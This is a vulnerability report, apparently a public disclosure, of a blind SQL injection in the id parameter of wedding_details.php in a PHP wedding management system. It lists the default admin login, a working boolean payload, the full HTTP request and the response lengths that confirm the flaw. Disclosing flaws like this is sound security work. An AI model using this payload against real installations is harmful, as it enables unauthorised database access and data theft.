# Wedding Management System v1.0 by codeastr.com has SQL injection

Author： k0xx

The password for the backend login account is: admin@mail.com/Password@123

vendors: https://codeastro.com/wedding-management-system-in-php-with-source-code/

Vulnerability File: /Wedding-Management/wedding_details.php

Vulnerability location: /Wedding-Management/wedding_details.php?id=,id

[+] Payload: /Wedding-Management/wedding_details.php?id=31%20and%20length(database())%20=9 // Leak place ---> id

Current database name: dbwedding,length is 9

```sql
GET /Wedding-Management/wedding_details.php?id=31%20and%20length(database())%20=9 HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
```

When length (database ()) = 8, Content-Length: 4824

![image](https://user-images.githubusercontent.com/54017627/167991476-8707557f-e951-4cee-a1cf-5bfd8132ceef.png)

![image](https://user-images.githubusercontent.com/54017627/167991520-2cbd91ce-d861-44a9-a8ac-e7bbe0bcfcb5.png)

When length (database ()) = 9, Content-Length: 5397

![image](https://user-images.githubusercontent.com/54017627/167991438-2b0fcd25-d996-4805-a6a8-14f2e77a246b.png)

![image](https://user-images.githubusercontent.com/54017627/167991500-2df43851-84fd-4b73-9785-e5f69cb0a8fb.png)
